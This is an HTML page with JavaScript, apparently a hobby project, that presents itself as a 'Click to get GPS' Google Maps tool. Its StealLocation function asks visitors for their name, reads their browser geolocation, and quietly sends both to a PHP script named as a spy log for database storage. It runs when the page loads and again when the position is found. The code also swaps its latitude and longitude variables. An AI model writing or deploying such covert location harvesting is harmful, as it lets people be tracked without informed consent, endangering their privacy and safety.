<!DOCTYPE html>
<html>
  <head>
  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
    <title>Click to get GPS</title>
    
    <!--This is an extension to mapsCoordinates.html. It loads the Google maps API, finds users location and sends it to another php file. Thats it. -->
    
    <!-- (õ.õ) Next line disables browser zooming for mobile devices (so Google zoom can be used) -->
    <meta name="viewport" content="initial-scale=1.0, user-scalable=no">
    <meta charset="utf-8">

    <style>
      html, body, #map-canvas {
        height: 100%;
        margin: 5px;
        padding: 10px
      }
    </style>
    
    <!--
    Include the maps javascript with sensor=true because this code is using a
    sensor (a GPS locator) to determine the user's location.
    See: https://developers.google.com/maps/documentation/javascript/tutorial#Loading_the_Maps_API
    -->
    <script src="https://maps.googleapis.com/maps/api/js?v=3.exp&sensor=true"></script>


<script>
// Note: This example requires that you consent to location sharing when
// prompted by your browser. If you see a blank space instead of the map, this
// is probably because you have denied permission for location sharing.

//var iHavePHPsAddress = 'test1.php';		//had the address of where to send the GET command
var iHavePHPsAddress = '20131218SpijunPamet.php';		//had the address of where to send the GET command
var map;  //for the APP
var markers = [];  //I need this if I want to delete them afterwards, otherwise not needed.
//var mojaLokacija = new google.maps.LatLng(111.11111,111.11111);  //This is how explicitly define my location.
var temp_lat;		//	temporary latitude  (idea is to also save the GSP of points in the future, thus temporary)
var temp_lng;		//	temporary longitude
var name = prompt("Please enter your name","Harry Potter");		// The site will Alert and ask for a name before it loads.


/////////Function to send GEOLOCATION to the PHP and save it on MYSQL. 
//longitude_spijun (and others) is the name of PHP variable in PHP file and also the name of the Column in the Mysql file.
// temp_lat will have the location I want from the user.
function StealLocation(){
 $.ajax
 ({
 type: "GET",
 url: iHavePHPsAddress,
 data: {latitude_spijun:temp_lat,
 		longitude_spijun:temp_lng,
 		name:name}
 })
 
 .done() 
 
}
////End of Steal function


///// This is Copy paste from Google bascially, starts the map API
function initialize() {
  var mapOptions = {
    zoom: 10,
    mapTypeId: google.maps.MapTypeId.ROADMAP,
  };
  
  map = new google.maps.Map(document.getElementById('map-canvas'),
      mapOptions);

///Click puts marker no the map
  google.maps.event.addListener(map, 'click', function(event) {
    addMarker(event.latLng);
  });
  
  
  ///////////////(õ.õ) HTML5 geolocation /////////////////  This tells me where you are.
  if(navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(function(position) {
      var pos = new google.maps.LatLng(position.coords.latitude,
                                       position.coords.longitude);

		////(õ.õ) Putting coordinates in infowindow
  		temp_lng = pos.lat() + '';  //pretvorba v string
  		temp_lng = temp_lng.substring(0,9);  //cutting away too many numbers
  		temp_lat = pos.lng() + '';
  		temp_lat = temp_lat.substring(0,9);
  		var pos_infowindow = 'I know where you are! <br />' +
  							 'Longitude: ' + temp_lng + '<br />' + 
  							 'Latitude: ' + temp_lat;
		
		///valling function to steal location
		StealLocation();
		
		
		//// end of coordinates in info window
      var infowindow = new google.maps.InfoWindow({
        map: map,
        position: pos,
        content: pos_infowindow
      });

      map.setCenter(pos);
    }, function() {
      handleNoGeolocation(true);
    });

  } 
  else
  	 {
    // Browser doesn't support Geolocation
    handleNoGeolocation(false);
 	 }
  }

function handleNoGeolocation(errorFlag) {
  if (errorFlag) {
    var content = 'Why you no tell me where you are!';
  } else {
    var content = 'Error: Your browser doesn\'t support geolocation.';
  }

  var options = {
    map: map,
    position: new google.maps.LatLng(60, 105),
    content: content
  };

  var infowindow = new google.maps.InfoWindow(options);
  map.setCenter(options.position);
}
////////////////(õ.õ) end of HTML5 Geolocation code

////////////////(õ.õ) Clickable Markers function
function addMarker(location) {
  var marker = new google.maps.Marker({
    position: location,
    map: map,
    //draggable:true  //ce ga premaknem, se koordinate ne popravijo
  });
  
  //make string from Coordinates:
  // var removed on the last part so it can be accesable with other functions. FLO
  var temp_lng = location.lat() + '';  //pretvorba v string
  temp_lng = temp_lng.substring(0,9);
  var temp_lat = location.lng() + '';
  temp_lat = temp_lat.substring(0,9);
 var location_string = '' +
  							 'Longitude: ' + temp_lng + '<br />' + 
  							 'Latitude: ' + temp_lat;
  
  
  //Puts info cloud to marker
	var marker_info = new google.maps.InfoWindow({
      content: location_string
  });
	google.maps.event.addListener(marker, 'click', function() {
    marker_info.open(map,marker);
  });
  // end of putting info cloud to marker
  markers.push(marker);
}


// Deletes all markers in the array by removing references to them.
function setAllMap(map) {
  for (var i = 0; i < markers.length; i++) {
    markers[i].setMap(map);
  }
}

// Sets the map on all markers in the array.
function deleteMarkers() {
  	setAllMap(null);
  	markers = [];
}
///end of clickable markers




////This is allways at the end - calls the loading function.
google.maps.event.addDomListener(window, 'load', initialize);


    </script>
  </head>
  <body onload="StealLocation();">
   <input onclick="deleteMarkers();" type=button value="Delete Markers">
    <div id="map-canvas"></div>
    
  </body>
</html>